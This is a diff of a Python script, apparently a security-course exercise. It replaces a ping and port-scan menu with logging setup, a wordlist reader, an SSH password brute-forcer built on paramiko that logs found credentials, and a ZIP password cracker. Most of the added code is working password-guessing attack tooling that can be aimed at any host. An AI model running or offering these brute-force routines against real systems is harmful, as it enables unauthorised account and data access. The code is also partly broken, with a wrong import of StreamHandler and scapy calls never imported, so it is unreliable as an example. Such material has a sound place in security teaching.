@@ -1,44 +1,97 @@
+import os
+import time
+import paramiko
+import zipfile
 import logging
-from ops26_2_core import scan_ip_and_ports, icmp_ping_sweep, generate_ip_range
+from logging.handlers import RotatingFileHandler, StreamHandler
 
-# Setup basic logging
-logging.basicConfig(filename='ops26-2.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s:%(message)s')
+# Function to send emails for ERROR logs (placeholder)
+def send_email(log_record):
+    # Implement your email sending logic here
+    pass
 
-def main():
+# Custom handler for emailing ERROR logs
+class EmailErrorHandler(logging.Handler):
+    def emit(self, record):
+        if record.levelno == logging.ERROR:
+            send_email(record)
+
+# Set up logging
+logger = logging.getLogger()
+logger.setLevel(logging.DEBUG)
+
+# StreamHandler for console output
+console_handler = StreamHandler()
+console_handler.setLevel(logging.DEBUG)
+console_format = logging.Formatter('%(asctime)s %(levelname)s:%(message)s')
+console_handler.setFormatter(console_format)
+logger.addHandler(console_handler)
+
+# FileHandler for file output
+file_handler = RotatingFileHandler('ops26-2.log', maxBytes=1000000, backupCount=5)
+file_handler.setLevel(logging.DEBUG)
+file_format = logging.Formatter('%(asctime)s %(levelname)s:%(message)s')
+file_handler.setFormatter(file_format)
+logger.addHandler(file_handler)
+
+# Email handler for ERROR logs
+email_handler = EmailErrorHandler()
+email_handler.setLevel(logging.ERROR)
+logger.addHandler(email_handler)
+
+def read_wordlist(file_path):
     try:
-        while True:
-            print("1. Scan IP Address and Ports")
-            print("2. ICMP Ping Sweep")
-            print("3. Exit")
-            choice = input("Select an option (1, 2, or 3): ")
+        with open(file_path, 'r', encoding='latin-1') as file:
+            words = file.readlines()
+            logger.info(f"Wordlist read successfully from {file_path}")
+            return words
+    except FileNotFoundError:
+        logger.error(f"File not found: {file_path}")
+        return None
 
-            if choice == "1":
-                target_ip = input("Enter target IP: ")
-                icmp_response = sr1(IP(dst=target_ip)/ICMP(), timeout=1, verbose=0)
-                if icmp_response is not None:
-                    print(f"{target_ip} is responding to ICMP ping.")
-                    logging.info(f"{target_ip} is responding to ICMP ping")
-                    scan_ip_and_ports(target_ip)
-                else:
-                    print(f"{target_ip} is down or not responding to ICMP ping.")
-                    logging.info(f"{target_ip} is down or not responding to ICMP ping")
-            elif choice == "2":
-                cidr = input("Enter network address (CIDR format, e.g., 192.168.1.0/24): ")
-                ip_list = generate_ip_range(cidr)
-                if ip_list:
-                    icmp_ping_sweep(ip_list)
-                else:
-                    print("Invalid CIDR block. Please enter a valid CIDR.")
-            elif choice == "3":
-                logging.info("Program exited by user.")
-                break
-            else:
-                print("Invalid choice. Please select a valid option.")
-                logging.warning("Invalid choice made in main menu.")
+def dictionary_iterator(words):
+    for word in words:
+        word = word.strip()
+        logger.debug(f"Word iterated: {word}")
+        time.sleep(0.5)  # Delay of 0.5 seconds between words
 
-    except KeyboardInterrupt:
-        logging.info("Operation cancelled by user.")
-        print("\nOperation cancelled by user.")
+def password_recognized(search_string, words):
+    if search_string in words:
+        logger.info(f"Search string found: {search_string}")
+        return True
+    else:
+        logger.warning(f"Search string not found: {search_string}")
+        return False
 
-if __name__ == "__main__":
-    main()
+def ssh_brute_force(host, username, words):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    for password in words:
+        password = password.strip()
+        try:
+            ssh.connect(host, username=username, password=password)
+            logger.info(f"Successful SSH login - Username: {username}, Password: {password}")
+            return True
+        except paramiko.AuthenticationException:
+            logger.warning(f"Failed SSH login attempt - Username: {username}, Password: {password}")
+        except paramiko.SSHException as e:
+            logger.error(f"SSH error - Username: {username}, Password: {password}: {str(e)}")
+        except Exception as e:
+            logger.error(f"General error - Username: {username}, Password: {password}: {str(e)}")
+
+    ssh.close()
+    return False
+
+def zip_brute_force(zip_file_path, words):
+    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
+        for password in words:
+            password = password.strip()
+            try:
+                zip_file.extractall(pwd=password.encode())
+                logger.info(f"Password cracked: {password}")
+                return True
+            except Exception as e:
+                logger.debug(f"Failed attempt with password: {password}, Error: {str(e)}")
+
+    return False
